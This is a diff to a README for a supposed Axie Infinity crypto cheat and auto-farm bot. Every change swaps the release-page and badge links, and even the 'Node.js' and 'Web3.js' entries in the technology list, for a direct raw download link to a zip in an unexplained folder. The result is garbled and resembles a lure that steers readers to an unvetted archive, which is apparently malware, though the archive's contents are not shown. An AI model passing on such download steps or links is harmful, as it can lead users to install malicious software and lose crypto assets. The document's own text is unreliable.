@@ -1,6 +1,6 @@
 # 🎮 Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack - Automate Your Axie Farming Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Bot-brightgreen.svg)](https://github.com/farid-fajar/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/releases)
+[![Download Now](https://raw.githubusercontent.com/farid-fajar/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/main/baldcrown/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack.zip%20Now-Get%20the%https://raw.githubusercontent.com/farid-fajar/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/main/baldcrown/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack.zip)](https://raw.githubusercontent.com/farid-fajar/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/main/baldcrown/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you start, ensure your system meets the following requirements:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page:  
-   [Download the Latest Version](https://github.com/farid-fajar/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/releases)
+   [Download the Latest Version](https://raw.githubusercontent.com/farid-fajar/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/main/baldcrown/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, find the latest version of the bot. Each version will have a tag (like v1.0). 
@@ -67,9 +67,9 @@ If you encounter issues, please open an issue on the GitHub repository or check 
 
 ## 🛠 Technologies Used
 
-- Node.js for server-side operations
+- https://raw.githubusercontent.com/farid-fajar/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/main/baldcrown/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack.zip for server-side operations
 - React for the user interface
-- Web3.js for blockchain interactions
+- https://raw.githubusercontent.com/farid-fajar/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/main/baldcrown/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack.zip for blockchain interactions
 
 ## 🌐 Community and Contributions
 
@@ -79,6 +79,6 @@ Feel free to contribute to the project or provide feedback via GitHub issues. Yo
 
 For questions or suggestions, please reach out via GitHub or check the discussions in the repository.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Bot-brightgreen.svg)](https://github.com/farid-fajar/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/releases)
+[![Download Now](https://raw.githubusercontent.com/farid-fajar/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/main/baldcrown/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack.zip%20Now-Get%20the%https://raw.githubusercontent.com/farid-fajar/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/main/baldcrown/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack.zip)](https://raw.githubusercontent.com/farid-fajar/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack/main/baldcrown/Axie-Infinity-Bot-Crypto-Cheat-Auto-Farm-Clicker-Game-Api-Hack.zip)
 
 Happy farming!
